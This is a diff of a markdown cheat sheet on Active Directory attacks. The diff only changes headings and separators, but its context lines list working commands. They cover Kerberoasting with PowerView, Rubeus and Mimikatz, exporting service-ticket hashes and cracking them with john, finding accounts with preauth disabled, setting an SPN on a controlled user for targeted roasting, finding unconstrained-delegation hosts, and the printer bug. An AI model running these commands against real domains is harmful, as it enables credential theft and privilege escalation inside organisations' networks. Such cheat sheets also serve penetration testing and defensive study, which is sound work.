@@ -2,6 +2,7 @@
 
 
 ### Kerberoasting
+---
 ```powershell
 # Standard AD User. Get Domain Users SPN. Users that are for services
 C:> . PowerView.ps1
@@ -10,7 +11,7 @@ C:> Get-DomainUser -SPN
 # Using AD Module
 C:> Get-ADUser -Filter {ServicePrincipalName ne ""$null ""} -Properties ServicePrincipalName
 ```
-#### Using `Rubeus.exe`
+##### Using `Rubeus.exe`
 ```powershell
 # Get kerberos stats
 C:> Rubeus.exe /stats
@@ -28,7 +29,7 @@ C:> Rubeus.exe kerberoast /outfile:hashes.txt
 # Crack with John
 C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
 ```
-#### Using Mimikatz
+##### Using Mimikatz
 ```powershell
 C:> Add-Type -AssemblyNAme System.IdentityModel
 
@@ -43,6 +44,7 @@ C:> Invoke-Mimikatz -Command '"kerberos::list /export"'
 C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>.kirbi
 ```
 ### Targeted Kerberoasting AS-REPs
+---
 ##### Enumerating accounts with Kerberos Preauth disabled
 ```powershell
 # PowerView
@@ -61,6 +63,7 @@ C:> Get-DomainUser -PreauthNotRequired -Verbose    # Check
 
 ```
 ### Targeted Kerberoasting Set SPN
+---
 With rights over a user, we can set a SPN to it, and then go for a AS-REPs attack.
 ```powershell
 # Enumerate permissions for RDPUsers
@@ -74,8 +77,9 @@ C:> Set-DomainObject -Identity support1user | Set @{serviceprincipalname='ops/wh
 ```
 
 ### Kerberos Delegation
+---
 
-#### Uncostrained Delegation
+##### Uncostrained Delegation
 ```powershell
 # Find Server with Unconstraided Delegation Enabled
 C:> . C:\AD\Tools\PowerView.ps1
@@ -85,7 +89,7 @@ C:> Get-DomainComputer -Unconstrained | select -ExpandProperty name
 ```
 - Requisite for elevation using this technique, is to compromise a user with Admin Rights on the host
 
-#### Printer Bug
+##### Printer Bug
 ```powershell
 # Need shell in the server to compromise
 # Launch Rubeus listener to capture TGT from DC 
